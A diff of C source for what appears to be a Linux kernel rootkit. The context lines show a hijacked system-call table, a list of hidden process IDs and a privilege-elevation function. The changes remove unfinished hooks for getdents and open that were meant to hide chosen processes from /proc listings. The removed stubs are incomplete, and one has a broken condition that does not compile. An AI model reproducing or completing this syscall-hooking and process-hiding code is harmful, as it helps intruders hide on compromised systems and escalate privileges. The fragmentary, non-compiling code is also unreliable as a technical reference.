@@ -32,10 +32,6 @@ struct pathname_struct pathname;
 
 struct hidden_pids_struct hidden_pids;
 
-/* pid of the process that has currently opened "/proc" */
-pid_t pid_proc_open;
-/* fd for opened "/proc" in this process */
-int fd_proc_open;
 
 
 /***************************************************************************/
@@ -51,7 +47,6 @@ int fd_proc_open;
 unsigned long **syscall_table;
 
 asmlinkage int (*original_close)(int fd);
-asmlinkage int (*original_open)(const char *pathname, int flags, int mode);
 
 
 int elevate_current_privileges(void)
@@ -127,21 +122,6 @@ out:
     return err;
 }
 
-asmlinkage int my_getdents(...)
-{
-    if (pid_proc_open == current->pid && fd_proc_open == fd) {
-        /* this means that we'll get dents for "/proc"
-           skip the one with pids in our hidden list */
-    }
-
-
-}
-asmlinkage int my_open(const char __user *pathname, int flags, int mode)
-{
-    if (pid_proc_open == current->pid && )
-
-
-}
 
 
 asmlinkage int my_close(int fd)
